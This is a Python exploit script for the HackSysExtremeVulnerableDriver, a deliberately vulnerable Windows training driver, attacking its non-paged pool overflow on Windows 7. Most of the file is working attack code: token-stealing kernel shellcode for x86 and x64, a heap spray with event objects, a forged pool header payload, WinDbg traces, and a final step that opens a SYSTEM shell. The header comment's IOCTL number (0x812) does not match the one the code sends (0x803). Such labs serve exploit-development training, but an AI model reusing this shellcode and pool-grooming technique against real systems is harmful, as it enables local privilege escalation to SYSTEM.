# -*- coding: utf-8 -*-
# This code actually works for - HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX IOCTL(0x812)
from ctypes import *
import ctypes
import os
import struct
import subprocess
import sys

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
gdi32 = windll.gdi32
user32 = windll.user32

def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """
    print(message)
    kernel32.OutputDebugStringA(message + "\n")

def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG

    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)
    
def ctl_code(code):
    """ Recreate CTL_CODE macro to generate driver IOCTL """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    return (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )

def _HANDLE_driver_connection():
    """ Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    return handle
        
def _ret_shellcode_buffer(shellcode):
    """ Payload memory allocation in user-land """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)

def NtAllocateVirtualMemory(shellcode_ptr, shellcode_len):
    """ Allocate shellcode address into current process [0x00000074] address, in order to trigger EIP overflow """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40 
    
    nt_result = ntdll.NtAllocateVirtualMemory(
        kernel32.GetCurrentProcess(),   # ProcessHandle
        byref(c_void_p(0x1)),           # *BaseAddress
        0,                              # ZeroBits
        byref(c_int(shellcode_len)),    # RegionSize
        MEM_COMMIT_MEM_RESERVE,         # AllocationType
        PAGE_EXECUTE_READWRITE          # Protect
    )
    
    csrc = create_string_buffer("\x00" * 0x70 + struct.pack("<I", shellcode_ptr), 0x00000074)
    memmove_result = memmove(0x4, addressof(csrc), 0x00000074)

    return True

def _send_payload(handle, payload_ptr, payload_len, code):
    """ Interacting with the driver """
    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code(code),     # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return IO_CTL

def _ret_shellcode_x64():
    """
    PLEASE READ THE FOLLOW TUTORIALS FIRST!!!
        
        1 - https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/
        2 - https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
    ------------------------------------------------------------------------
    Generate Shellcode:
    
        1 - https://defuse.ca/online-x86-assembler.htm#disassembly
    ------------------------------------------------------------------------
    Windows Assembly x86/x64- REPL:
    
        1 - https://github.com/zerosum0x0/WinREPL
    ------------------------------------------------------------------------
    ; save registers
    push rax
    push rbx
    push rcx

    ; uf nt!PsGetCurrentProcess
    mov rax, qword ptr [gs:0x188] ; Current Thread
    mov rax, qword ptr [rax + 0x70] ; Current Process Address | 1: kd> !process fffffa800700f060 0
    ;                                                         | .... python.exe
        
    ; save rax to rbx
    mov rbx, rax 

    search_system_PID:

    mov rbx, qword ptr [rbx + 0x188] ; Pointer to ActiveProcessLinks.Flink[0] -> Get List of processes | 1: kd> dps fffffa800700f060+0x188
    ;                                                                                                   | fffffa80`0700f1e8  fffffa80`08fbfcb8
        
    sub rbx, 0x188 ; Get Previous Process Address -> fffffa80`08fbfcb8-0x188 | 1: kd> !process fffffa80`08fbfb30 0 
    ;                                                                        | .... conhost.exe   

    mov rcx, qword ptr [rbx+ 0x180] ; Get Previous Process Address PID -> [UniqueProcessID] | 1: kd> dps fffffa8008fbfb30+180h
    ;                                                                                       | fffffa80`08fbfcb0  00000000`00000cc0 = PID [3264] 

    cmp rcx, 0x04 ; Loop comparing if current value is respectively for SYSTEM PID [0x04]
    jnz search_system_PID

    ; If found SYSTEM PID [0x40], copy token for current process
    mov rcx, qword ptr [rbx + 0x208] ; Token struct -> dt nt!_EPROCESS <PROC ADDRESS> | 1: kd> dt nt!_EPROCESS  fffffa8008fbfb30 
    ;                                                                                   +0x208 Token            : _EX_FAST_REF

    and cl, 0xf0 ; Flip last bit in order to get SYSTEM token address value
    mov qword ptr [rax + 0x208], rcx ; Move SYSTEM token value to current Process (python.exe)

    ; restore registers (required for proper stack return)
    pop rcx
    pop rbx
    pop rax
    
    add rsp, 0x66 ; stack alignment -> IMPORTANT: substract previous ESP address for the one after crashes.
    xor rax, rax  ; (i.e. NT_SUCCESS)
    ret

    # CUSTOM win7 x64 7601.17514.amd64fre.win7sp1_rtm.101119-1850 kshellcode

    IMPORTANT FOR DEBUGGING:

        When "\xcc"(First byte of shellcode) gets executed from windbg,
        stop the usage of [VirtualKD]. Reboot VM and re-run the exploit
        The shellcode should be executed as normal without crash entire VM.

    ------------------------------------------------------------------------

    Current Thread flow (nt.dll methods):

        nt!_KPCR(0x00)
        
        | +0x180 Prcb             : _KPRCB
        v
           
        nt!_KPRCB(0x180)

        | +0x008 CurrentThread    : Ptr64 _KTHREAD
        v

        nt!_KTHREAD(0x180 + 0x08)

        | +0x050 ApcState         : _KAPC_STATE
        v
           
        nt!_KAPC_STATE(0x180 + 0x08 + 0x50)

        | +0x020 Process          : Ptr64 _KPROCESS
        v

        nt!_KPROCESS(0x180 + 0x08 + 0x50 + 0x20)
                
    ------------------------------------------------------------------------
        
    Usefull commands:

        Identify KTHREAD + ActiveProcessLinks offset (easy):
            1 - u nt!PsGetCurrentProcess
                |
                v
                nt!PsGetCurrentProcess:
                fffff800`02aeebb0 65488b042588010000 mov     rax,qword ptr gs:[188h]
                fffff800`02aeebb9 488b4070           mov     rax,qword ptr [rax+70h]
                fffff800`02aeebbd c3                 ret
        #TODO
                .....
        """

    shellcode = bytearray(
        "\x50\x53\x51\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC3"
        "\x48\x8B\x9B\x88\x01\x00\x00\x48\x81\xEB\x88\x01\x00\x00\x48\x8B\x8B\x80\x01"
        "\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x08\x02\x00\x00\x80\xE1\xF0\x48"
        "\x89\x88\x08\x02\x00\x00\x59\x5B\x58\x48\x83\xC4\x28\x48\x31\xc0\xc3"
    )
    
    return shellcode


def _ret_shellcode_x86():
    shellcode = bytearray(
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad		
        "\xC2\x10\x00"                  # ret 10
    )
    return shellcode

def _heap_spray():
    """ Create Threads for Heap Spraying technique """
    create_event_array_1 = []
    create_event_array_2 = []
    debug_print("[*] Allocating [15000] CreateEventA Objects")
    for i in range(10000):
       create_event_array_1.append(kernel32.CreateEventA(None, False, False, None))

    for i in range(5000):
       create_event_array_2.append(kernel32.CreateEventA(None, False, False, None))

    debug_print("[*] Freeing Objects in order to create non-paged pools holes")
    for x in range (0,5000,16):
        for y in range (8):
	    kernel32.CloseHandle(create_event_array_2[ x + y ])
	    
    return create_event_array_2

def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """

    create_event_array_2 = _heap_spray()
    debug_print("\n[!] Heap Sprayed, trying to control EIP")

    # shellcode virtual_allocation()
    shellcode = _ret_shellcode_x86() 
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer(shellcode)

    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))

    if NtAllocateVirtualMemory(shellcode_ptr, shellcode_len):
        debug_print("\n[+] Fake object allocated at address: [0x00000074]\n")
    
    debug_print(hexdump(0x00000074, 16))
    
    """
    857da0c8 : tag Hack, size     0x1f8, Nonpaged pool
    1: kd> !pool 857da0c8 
    Pool page 857da0c8 region is Nonpaged pool
     857da000 size:   40 previous size:    0  (Allocated)  Even (Protected)
     857da040 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da080 size:   40 previous size:   40  (Allocated)  Even (Protected)
    *857da0c0 size:  200 previous size:   40  (Allocated) *Hack
                    Owning component : Unknown (update pooltag.txt)
     857da2c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
     857da300 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da340 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da380 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da3c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da400 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da440 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da480 size:   40 previous size:   40  (Allocated)  Even (Protected)
     857da4c0 size:   20 previous size:   40  (Free)       Even
     857da4e0 size:  1e0 previous size:   20  (Allocated)  Irp 
     <..snip..>

    ------------------------------------------------
    1: kd> dt _POOL_HEADEr 857da2c0
    nt!_POOL_HEADER
       +0x000 PreviousSize     : 0y001000000 (0x40)
       +0x000 PoolIndex        : 0y0000000 (0)
       +0x002 BlockSize        : 0y000001000 (0x8)
       +0x002 PoolType         : 0y0000010 (0x2)
       +0x000 Ulong1           : 0x4080040
       +0x004 PoolTag          : 0xee657645
       +0x004 AllocatorBackTraceIndex : 0x7645
       +0x006 PoolTagHash      : 0xee65

    """
    payload = "\x41" * 0x1f8
    payload += struct.pack("<I", 0x04080040) 
    payload += struct.pack("<I", 0xee657645) # POOL TAG (Event)
    payload += struct.pack("<I", 0x00)       # PagedPoolCharge
    payload += struct.pack("<I", 0x40)       # NonPagedPoolCharge (0x40)
    payload += struct.pack("<I", 0x00)       # SecurityDescriptorCharge
    payload += struct.pack("<I", 0x00)       # SecurityDescriptorQuotaBlock
    payload += struct.pack("<I", 0x01)       # PointerCount (0x1)
    payload += struct.pack("<I", 0x01)       # HandleCount (0x1)
    payload += struct.pack("<I", 0x00)       # Lock -> _EX_PUSH_LOCK
    payload += "\x00"                        # TypeIndex (Rewrite 0xC -> 0x0)
    payload += "\x00"                        # TraceFlags
    payload += "\x08"                        # InfoMask
    payload += "\x00"                        # Flags
    
    payload_ptr = id(payload) + 0x14
    """
     python2.7 id() -> Commom issues and how to deal with it
    
     0: kd> dc 0x1760130
    .---------------------------------------------------------------.
    |01760130  00000001 6a7ae328 00000200 ffffffff  ....(ãzj....ÿÿÿÿ| -> Additional bytes when utilizing python id() function
    |                  .--------------------------------------------'
    |01760140  00000000|41414141 41414141 41414141  ....AAAAAAAAAAAA
    '------------------'
     01760150  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760160  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760170  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760180  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760190  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    ---------------------------------------------------------------
     0: kd> dc 0x1760130+0x14
     01760144  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760154  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760164  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760174  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA  -> Without additional bytes
     01760184  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760194  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    """
    
    debug_print("\n[!] payload_ptr: 0x%x" % payload_ptr)
    payload_len = len(payload)
    
    # driver file handler 
    hFile = _HANDLE_driver_connection()       
    debug_print("\n[+] Driver connection initilized!\n")
    raw_input("[*] Press any key to send payload...")

    # send custom payload -> junk + <shellcode_ptr> 
    _send_payload(
        hFile,
        payload_ptr,
        payload_len,
        code
    )

    debug_print("[*] Freeing Dummy Pools to prevent [NON_PAGED_POOL] crashes")
    for i in create_event_array_2:
        kernel32.CloseHandle(i)
        
    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("cmd.exe /K") # get SYSTEM shell
    
if __name__ == "__main__":
    """
    TUTORIAL:
    	https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win7%20x86/HEVD_pooloverflow.py
    	https://www.fuzzysecurity.com/tutorials/expDev/20.html
    
    IOCTL to trigger BufferOverflow in win7 Non-Paged Kernel Pool
        http://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h
    """
    code = 0x803    # HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL - IOCTL(0x803)
    _exploit(code)
